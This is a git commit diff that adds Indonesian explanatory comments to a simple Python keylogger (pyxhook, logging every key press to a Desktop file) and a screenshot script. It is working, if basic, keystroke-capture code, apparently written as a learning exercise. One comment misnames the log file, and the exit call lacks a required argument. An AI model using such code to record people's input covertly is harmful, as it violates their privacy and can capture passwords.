82b5f29e65d00f4b6f0e4387a65f6f6c2932024a
Ari Davis <aridavis6688@gmail.com>
2020-03-27 23:26:03 +0700

    Added Code Notes

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,16 @@
 import pyxhook
 import os
 
+
+#get("keyboard_log_file") -> Jikalau ada environment variables
 key_log_file = os.environ.get("keyboard_log_file", os.path.expanduser("~/Desktop/keylogger.log"))
 
 def onKeyDown(event):
+    # Kita contohkan, kalo kita menekan tombol ` maka program akan keluar
     if(event.Key == 'grave'):
         os._exit()
     with open(key_log_file, 'a') as f :
+        #membuka file mouse_log_file dengan mode a (append)
         f.write('{}\n'.format(event.Key))
 
 
--- screenshooter.py
+++ screenshooter.py
@@ -2,5 +2,8 @@ import autopy
 import os
 import time
 
+# Ngescreenshot
 bitmap = autopy.bitmap.capture_screen()
+
+# Menyimpan dalam format timestamp.png
 bitmap.save( str(round(time.time())) +".png")
